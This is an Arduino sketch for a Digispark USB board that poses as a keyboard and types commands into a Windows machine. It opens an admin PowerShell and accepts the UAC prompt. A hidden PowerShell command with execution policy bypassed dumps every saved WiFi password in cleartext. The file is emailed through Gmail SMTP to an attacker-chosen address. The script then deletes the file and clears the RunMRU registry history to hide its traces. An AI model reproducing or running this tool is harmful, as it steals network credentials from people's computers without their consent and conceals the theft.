/********************************************************************************
  Gather WiFi data and email it,  !!!Need admin privileges and uac at default!!! 
  Change line 27 and 48 ('Desktop') to location you want file saved
  Change line 48 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
  Change line 67 to set location file was saved
  CREDIT: C4PT14ND34DP00L
*******************************************************************************/

#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
  DigiKeyboard.delay(800);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("MODE 15,1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv  .csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  //Email file
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
  DigiKeyboard.delay(800);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("MODE 15,1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'DigiDuck WiFi Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your Digispark'; $ReportEmail.Attachments.Add($DesktopPath + '\\ .csv'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);    //comment out if uac is off
  DigiKeyboard.delay(800);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("MODE 15,1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  //Change to file location
  DigiKeyboard.print("cd %UserProfile%\\Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  //Delete file
  DigiKeyboard.print(F("del  .csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  //Light up the onboard LED when the script is done
  int ledPin = 1;
  digitalWrite(ledPin, HIGH);
}

void loop() {
}
